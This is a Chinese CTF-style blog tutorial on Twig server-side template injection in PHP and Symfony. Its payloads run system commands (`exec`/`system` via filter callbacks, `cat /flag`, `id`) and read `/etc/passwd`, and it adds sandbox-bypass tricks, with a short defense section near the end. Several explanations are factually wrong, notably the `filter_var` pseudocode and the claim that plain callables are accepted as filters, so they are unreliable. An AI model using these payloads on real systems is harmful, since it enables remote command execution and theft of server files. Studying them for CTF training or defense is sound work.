---
title: SSTI之twig
date: 2026-04-11
tags: [SSTI专题]
categories: 
  - web安全
  - PHP安全
excerpt: 由[BJDCTF2020]Cookie is so stable 1引起的关于SSTI的学习
---

# Twig与SSTI

## twig简介

twig是一个PHP的现代模板引擎，广泛用于Symfony框架。

### twig的三种基础语法结构

- `{{...}}`：用于输出变量或表达式的值。

```twig
hello,{{user.name}}
```

- `{%...%}`：用于执行逻辑控制，如 if 判断，for 循环

```twig
{# 判断是否显示 #}
{% if user.is_admin %}
    <a href="/admin">管理后台</a>
{% endif %}
```

- `{{#...#}}`：用于写注释，在最终的HTML源码中是看不到的

```twig
{# 这是给程序员看的备注，用户看不见 #}
```

twig也有沙箱模式，默认禁用危险函数（如system），但需要手动启用完整沙箱限制。

## 开发中的代码样例

### 安全的样例

```php
// PHP控制器逻辑（安全用法）
require_once 'vendor/autoload.php';
$loader = new \Twig\Loader\ArrayLoader([
    'index' => 'Hello, {{ name }}!',
]);
$twig = new \Twig\Environment($loader);
$name = htmlspecialchars($_GET['name']); // 输入过滤
echo $twig->render('index', ['name' => $name]);
```

为什么这样是安全的？

`$twig->render('index', ['name' => $name])`在这段代码中，`'index'`让twig去加载预先写好的模板文件，这个文件内容是服务器上硬编码的，用户无法修改。

`['name' => $name]`这里则是告诉twig把这个变量的值直接填充到模板里的`{{name}}`。

### 不安全的样例

```php
// PHP控制器逻辑（危险操作！）
$twig = new \Twig\Environment($loader);
$user_input = $_GET['content']; // 未过滤直接传入模板
echo $twig->render($user_input, []); // 直接渲染用户输入
```

为什么这样不安全？

在twig的设计中，`render()`方法的签名一般是：

```php
render(string $template_name, array $context = [])
```

第一个参数表示模板文件路径或模板标识符，第二个参数是填充进模板的数据。

这样就会直接直接渲染用户输入。

## 检测

在找到注入点之后，我们要先判断当前是否是沙箱模式：

```twig
{{constant('PHP_VERSION')}}      //判断PHP版本
{{_self.version}}            //判断twig版本
```

在twig模板引擎中，`_self`是一个全局变量，在 twig 1.x 版本中，`_self`代表当前模板的实例，通过它可以访问到模板对象的属性和方法，例如`_self.env`可以获取到 twig 的核心环境对象，即`Twig_Environment`。

如果`{{_self.env}}`返回`null`或者报错，则沙箱已启用。

## 漏洞利用

### 非沙箱模式利用

#### 命令执行

```twig
{{['id']|filter('system')}}       <!-- 执行系统命令 -->
{{['cat /etc/passwd']|map('system')}}
```

这段代码能生效的前提是：攻击者必须先通过漏洞将PHP的`system`函数注册为 twig 的动态过滤器回调，一般利用`registerUndefinedFilterCallback`来完成。

##### 什么是过滤器

在 twig 模板引擎中，过滤器是用于处理数据输出格式的核心工具。原始数据经过管道符`|`左侧流入，在右侧过滤器中进行格式化处理之后，最终显示在页面上。

##### CTF中的payload样例

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```

这里逐步拆解这个payload的执行逻辑。

###### 劫持过滤器系统

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}
```

- `_self.env`:通过 twig 内部变量获取到核心环境对象。
- `registerUndefinedFilterCallback`：这是环境对象的一个方法。设计初衷是：当模板中调用了一个不存在的过滤器时，twig 会访问这个方法来确认该怎么处理。
- `"exec"`：把PHP的系统命令执行函数的名字作为参数传入

这里解释一下为什么会导致 exec 这个字符串传入后会导致命令执行。

下面是 twig 源码的简化版：

```php
public function getFilter($name) {
    // ... 查找过滤器 ...
    if (!isset($this->filters[$name])) {
        // 如果找不到，且注册了回调，就触发回调
        if ($this->undefinedFilterCallback) {
            call_user_func($this->undefinedFilterCallback, $name);
        }
    }
}
```

在这里面我们可以看到，twig 使用了`call_user_func`这个函数来实现动态过滤器回调的注册，一旦我们能控制`undefinedFilterCallback`这个属性，就有可能实现RCE。

所以如果我们将`exec`这个字符串传入`registerUndefinedFilterCallback`方法，就会导致调用一切不存在的过滤器时，都会进入`call_user_func`函数中，与前面的`$this->undefinedFilterCallback`属性结合，进行动态函数调用。

###### 调用不存在的过滤器

```twig
{{_self.env.getFilter("cat /flag")}}
```

- `getFilter`这个方法用来获取一个过滤器实例。当 twig 试图获取一个名叫`cat /flag`的过滤器时，发现不存在这个过滤器。
- 触发回调：因为找不到，twig 就会去调用上面注册好的回调函数并把过滤器的名字作为第一个参数传入。

回到最开始的命令执行的样例：

1. `{{['id']|filter('system')}}`

- `['id']`：这是一个PHP数组。
- `|filter('system')`：`filter`是 twig 的数组过滤器，作用是：对数组的每一个元素，都调用指定的回调函数进行过滤，返回过滤后的内容。

2. `{{['cat /etc/passwd']|map('system')}}`

- `['cat /etc/passwd']`数组元素是一个完整的命令字符串。
- `|map('system')`：`map`是 twig 中功能和`filter`类似的过滤器，作用是对数组中的每一个元素应用一个回调函数，并将该回调函数的返回值组成一个新数组。

#### 文件读取

```twig
{{app.request.files.get(1).__construct('/etc/passwd','')}}
{{app.request.files.get(1).openFile.read(1000)}}
```

这个payload常针对 **Symfony 框架**进行文件读取，利用框架在模板上下文中暴露的合法对象来实施攻击。

简单来说，攻击者利用了 Symfony 的 `UploadedFile` 类作为跳板，凭空创建了一个指向系统敏感文件（如 `/etc/passwd`）的“文件句柄”，然后通过合法的读取方法将内容窃取出来。

##### 流程拆解

###### 第一步：创建一个指向目标文件的“幽灵”对象

- `app.request.files`：这是 Symfony 在处理 HTTP 请求时，用于存放上传文件信息（`UploadedFile`对象）的集合。
- `.get(1)`：获取文件集合中的某个元素。这里攻击者并不关心具体是哪个上传文件，只是需要拿到一个`UploadedFile`类的实例。
- `.__construct('/etc/passwd','')`：这是整个攻击链的核心与关键。它直接调用了`UploadedFile`类的构造方法，并传入两个参数：
  - `/etc/passwd`：读取的文件
  - `''`：原始文件名。

这里结合 Symfony 源码来探究为什么`{{ app.request.files.get(1) }}`能获取到`UploadedFile`实例：

1. 起点：`app`全局变量

在 Symfony 的 Twig 模板中，`app`是一个全局可用的变量，它是 `AppVariable` 类的一个实例。这个类可以理解为模板中的"服务容器"，负责暴露框架的核心组件供模板调用。其中，`app.request` 属性会返回当前 HTTP 请求的 `Request` 对象。

2. 第一层：`app.request`获取`Request`对象

`app.request` 返回的是一个 `Symfony\Component\HttpFoundation\Request` 类的实例。这个类封装了所有的 HTTP 请求数据.

在 Request 类的源码中，它的构造函数接收一个 `$files` 参数（类型是 `FileBag`），并赋值给 `$this->files` 属性。简化的构造逻辑如下：

```php
// Symfony\Component\HttpFoundation\Request
class Request {
    public $files; // 类型是 FileBag
    
    public function __construct(..., $files = []) {
        // ...
        $this->files = new FileBag($files); // 初始化 files 属性
    }
}
```

这意味着，通过 `app.request.files`，我们就拿到了一个 `FileBag` 对象。

3. 第二层：`.files`获取 `FileBag` 对象

`FileBag`类专门负责管理上传的文件。它的构造函数接收一个包含上传文件信息的数组，并调用 `replace`和 `add`方法进行处理：

```php
// Symfony\Component\HttpFoundation\FileBag
class FileBag extends ParameterBag {
    public function __construct(array $parameters = []) {
        $this->replace($parameters);
    }
    
    public function add(array $files = []) {
        foreach ($files as $key => $file) {
            $this->set($key, $file);
        }
    }
}
```

它继承自 `ParameterBag`，因此具备了 `get($key)` 等方法，可以通过键名来获取内部的元素。

4. 第三层：`.get(1)`触发 `convertFileInformation` 获取`UploadedFile`实例

`FileBag`的`set`方法在被调用时，会自动调用一个内部方法`convertFileInformation`，将原始的上传文件信息转换成`UploadedFile`对象。

```php
// Symfony\Component\HttpFoundation\FileBag
protected function convertFileInformation($file) {
    if ($file instanceof UploadedFile) {
        return $file;
    }
    // ... 对 $_FILES 格式的数据进行修复和转换
    $file = new UploadedFile(
        $file['tmp_name'], 
        $file['name'], 
        $file['type'], 
        $file['size'], 
        $file['error']
    );
    return $file;
}
```

因此，当调用`.get(1)`时，实际上是从`FileBag`对象的参数存储中，取出了一个已经被 `convertFileInformation`方法实例化好的 `UploadedFile` 对象。

下面是两个关键的类：

1. `Symfony\Component\HttpFoundation\File\UploadedFile`的构造函数

```php
// 文件位置: vendor/symfony/http-foundation/File/UploadedFile.php
class UploadedFile extends File
{
    public function __construct($path, $originalName, $mimeType = null, $size = null, $error = null, $test = false) {
        // ... 省略一些初始化和检查 ...
        
        $this->originalName = $this->getName($originalName);
        $this->mimeType = $mimeType ?: 'application/octet-stream';
        $this->size = $size;
        $this->error = $error ?: UPLOAD_ERR_OK;
        $this->test = (bool) $test;
        
        // [✓] 关键点1：调用了父类 File 的构造函数，并将 $path 传递过去
        parent::__construct($path, UPLOAD_ERR_OK === $this->error);
    }
    // ...
}
```

在这个构造函数中，攻击者传入的`/etc/passwd`被赋值给了`$path`参数。然后，它通过 `parent::__construct($path, ...)`将这个路径传递给了它的父类 `File`。

2. 父类`Symfony\Component\HttpFoundation\File\File`的构造函数

```php
// 文件位置: vendor/symfony/http-foundation/File/File.php
class File extends \SplFileInfo
{
    public function __construct($path, $checkPath = true) {
        if ($checkPath && !is_file($path)) {
            throw new FileNotFoundException($path);
        }
        // [✓] 关键点2：最终调用了 PHP 原生 SplFileInfo 类的构造函数
        parent::__construct($path);
    }
    // ...
}
```

在这里，Symfony 的 `File` 类又将 `$path`（即 `/etc/passwd`）传递给了 PHP 内核的 `SplFileInfo` 类。`SplFileInfo` 是 PHP 中所有文件操作对象的基础，一旦它被指向某个路径，该对象就代表了这个文件，并拥有了操作该文件的方法。

经过这些操作之后，`SplFileInfo`就被指向了`/etc/passwd`，接下来就是读取该文件。

```twig
{{app.request.files.get(1).openFile.read(1000)}}
```

`app.request.files.get(1)`获取到`UploadedFile`实例后，由于继承于`SplFileInfo`这个类，所以能调用其所有的公有方法，其中就有`openFile()`。payload中`openFile`在调用时没有加括号是因为在 twig 模板语法中调用无参数对象方法时括号可以省略。

`openFile()`的方法签名：

```php
public SplFileObject SplFileInfo::openFile ([ string $open_mode = "r" [, bool $use_include_path = false [, resource $context = NULL ]]] )
```

返回了一个`SplFileObject`对象。

`SplFileObject`是一个功能全面的文件操作类，它从 `SplFileInfo` 继承而来，并提供了读写文件内容的一系列方法。在payload中，调用这个对象的`read()`来读取对应字节数。

### 沙箱模式利用

#### 使用内置过滤器链

```twig
{{['id']|filter('system')|join(',')}}  //绕过黑名单检查
```

- `['id']|filter('system')`：这是攻击的核心步骤。`filter` 是一个合法的数组过滤器，用于筛选数组元素。正常情况下，它的参数应该是一个测试函数，但攻击者传入的是字符串 `'system'`。在特定条件下，Twig 会将这个字符串解析为 PHP 内置的 `system` 函数，并对数组中的每个元素（这里是字符串 `'id'`）调用它。这等效于在服务器上执行了 `system('id')` 命令。关键在于，`filter` 是合法的过滤器，而 `'system'` 只是它接受的字符串参数。某些不完善的沙盒规则可能只检查了 `{{ system('id') }}` 这种直接的函数调用，却忽略了对 filter 参数的检查。
- `|join(',')`：这部分起到伪装和辅助绕过的作用。`join` 也是一个合法的数组过滤器，作用是将数组元素拼接成字符串。

#### 利用属性注入

```php
{{app.request.query.filter('system','id')}}
```

`app.request`获取`Request`对象。

`Request`类简化源码：

```php
// Symfony\Component\HttpFoundation\Request
class Request
{
    // 存储 GET 参数的 ParameterBag 对象
    public $query;

    public function __construct(array $query = [], ...)
    {
        // 关键点：将 GET 参数数组封装成 ParameterBag 对象
        $this->query = new ParameterBag($query);
    }
}
```

访问 `.query` 时，返回的是一个 `ParameterBag` 对象，它管理着所有的 URL 查询参数。

`ParameterBag` 类的 `filter` 方法：

```php
// Symfony\Component\HttpFoundation\ParameterBag
class ParameterBag
{
    // 存储参数的数组
    protected $parameters = [];

    /**
     * 过滤某个参数的值
     *
     * @param string $key     参数名
     * @param mixed  $default 默认值（如果参数不存在）
     * @param int    $filter  过滤器常量（如 FILTER_VALIDATE_EMAIL）
     * @param mixed  $options 过滤器选项
     */
    public function filter(string $key, $default = null, int $filter = FILTER_DEFAULT, $options = [])
    {
        // 获取参数的值，如果不存在则使用 $default
        $value = $this->get($key, $default);

        // 关键点：这里调用了 PHP 原生的 filter_var 函数
        // 并且把用户可控的 $filter 和 $value 都传了进去
        return filter_var($value, $filter, $options);
    }

    public function get(string $key, $default = null)
    {
        // 如果参数存在，返回其值；否则返回默认值
        return array_key_exists($key, $this->parameters) ? $this->parameters[$key] : $default;
    }
}
```

它内部直接调用了 PHP 的 `filter_var` 函数，并将 `$value`（待过滤的值）和 `$filter`（过滤器）原封不动地传递过去。

**漏洞成因**：`filter_var`方法假设 `$filter` 参数一定是一个整数常量（如 FILTER_VALIDATE_EMAIL），但实际上 PHP 的 filter_var 函数也接受回调函数名作为过滤器。

PHP 原生的 `filter_var` 函数

```php
// PHP 内核函数（C 语言实现，此处为行为等效的 PHP 伪代码）
function filter_var($variable, $filter = FILTER_DEFAULT, $options = [])
{
    // 情况1：$filter 是一个整数常量（正常用法）
    if (is_int($filter)) {
        // 根据常量 ID 执行对应的过滤逻辑
        return php_filter($variable, $filter, $options);
    }
    
    // 情况2：$filter 是一个回调函数（Callable）
    if (is_callable($filter)) {
        // 关键点：直接调用该回调函数，并把 $variable 作为参数传入
        return call_user_func($filter, $variable);
    }
    
    return $variable;
}
```

PHP 官方文档明确说明：`filter_var` 的 `$filter` 参数可以是一个回调函数（Callable）。

当传入字符串 `'system'` 时，PHP 的可变函数（Variable Function）机制会将其解析为系统命令执行函数 `system()`。

于是，`filter_var('id', 'system')` 等效于 `system('id')`，导致命令执行。

## 防御手段

1. 启用沙箱

```php
$policy = new \Twig\Sandbox\SecurityPolicy([], [], [], [], []);
$twig->addExtension(new \Twig\Extension\SandboxExtension($policy, true));
```

2. 输入过滤：避免用户输入直接控制模板内容。
3. 禁用危险函数：在php.ini中禁用`system`、`exec`等函数。

## 绕过技巧

### 字符串拼接

```twig
{{['id']|filter('sy'~'stem')}}
```

### 利用`attribute`函数

```twig
{{attribute(_self, 'env')}}  <!-- 访问受限属性 -->
```

在 Twig 中，`attribute` 函数用于动态地访问一个对象的属性或方法。

基本语法：

```twig
{{ attribute(object, method) }}
{{ attribute(object, method, arguments) }}
{{ attribute(object, property) }}
```

